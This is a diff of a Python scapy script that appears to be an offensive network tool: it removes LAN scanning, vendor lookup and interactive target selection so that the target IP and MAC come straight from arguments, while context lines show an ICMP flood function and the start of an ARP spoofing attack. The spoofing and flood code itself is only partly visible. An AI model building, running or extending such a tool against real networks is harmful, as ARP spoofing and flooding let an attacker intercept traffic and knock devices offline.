@@ -8,20 +8,6 @@ from scapy.layers.l2 import ARP, Ether
 import netifaces
 import threading
 
-
-
-def get_vendor(mac_address):
-    try:
-        url = f"https://api.macvendors.com/{mac_address}"
-        response = requests.get(url, timeout=5)
-        if response.status_code == 200:
-            return response.text
-        else:
-            return "Unknown Vendor"
-    except requests.exceptions.RequestException:
-        return "Unknown Vendor"
-
-
 def get_gateway_info():
     gateways = netifaces.gateways()
     default_gateway = gateways['default'][netifaces.AF_INET]
@@ -39,36 +25,6 @@ def get_gateway_info():
         break
 
     return gateway_ip, gateway_mac, iface
-
-
-def scan_network(scan_ip, iface):
-    arp = ARP(pdst=scan_ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether / arp
-
-    result = srp(packet, iface=iface, timeout=3, verbose=0)[0]
-    devices = []
-
-    for i in range(len(result)):
-        sent, received = result[i]
-        device_ip = received.psrc
-        device_mac = received.hwsrc
-        vendor = get_vendor(device_mac)
-        devices.append({
-            'num': i,
-            'ip': device_ip,
-            'mac': device_mac,
-            'vendor': vendor
-        })
-
-    return devices
-
-
-def print_device_info(devices):
-    print("\nDevices in network:")
-    for idx, device in enumerate(devices):
-        print(f"{idx}: IP: {device['ip']} \t MAC: {device['mac']} \t Vendor: {device['vendor']}")
-
 
 def icmp_flood(target_ip, iface):
     print(f"[⚡] Starting ICMP flood on {target_ip} via {iface}...")
@@ -93,41 +49,13 @@ def main():
     parser.add_argument("-m", "--target-mac", help="Target MAC address", type=str)
     args = parser.parse_args()
 
+
+
+    target_IP = args.target_ip
+    target_MAC = args.target_mac
     gateway_ip, gateway_mac, iface = get_gateway_info()
-    scan_ip = '.'.join(gateway_ip.split('.')[:3]) + '.0/24'
+    print(f"[INPUT] Provided target: IP: {target_IP}, MAC: {target_MAC}")
 
-    print(f"[INFO] Gateway IP: {gateway_ip}")
-    print(f"[INFO] Gateway MAC: {gateway_mac}")
-    print(f"[INFO] Interface: {iface}")
-    print(f"[INFO] Scanning subnet: {scan_ip}")
-
-    target_IP = None
-    target_MAC = None
-
-    if args.target_ip and args.target_mac:
-        target_IP = args.target_ip
-        target_MAC = args.target_mac
-        print(f"[INPUT] Provided target: IP: {target_IP}, MAC: {target_MAC}")
-    else:
-        devices = scan_network(scan_ip, iface)
-        print_device_info(devices)
-
-        continuing = input("\nDo you want to process attack? YES/n: ").strip()
-        if continuing.lower() != "yes":
-            print("Stopping and restoring...")
-            sys.exit()
-
-        while True:
-            try:
-                i = int(input("Select target number: "))
-                target_IP = devices[i]['ip']
-                target_MAC = devices[i]['mac']
-                print(f"\nTarget selected:\n➡ IP: {target_IP}\n➡ MAC: {target_MAC}\n➡ Vendor: {devices[i]['vendor']}")
-                confirm = input("Is this target correct? Y/n: ").strip().lower()
-                if confirm == 'y' or confirm == 'yes':
-                    break
-            except (ValueError, IndexError):
-                print("Invalid selection. Try again.")
 
     try:
         print("\nStarting ARP spoofing attack...")
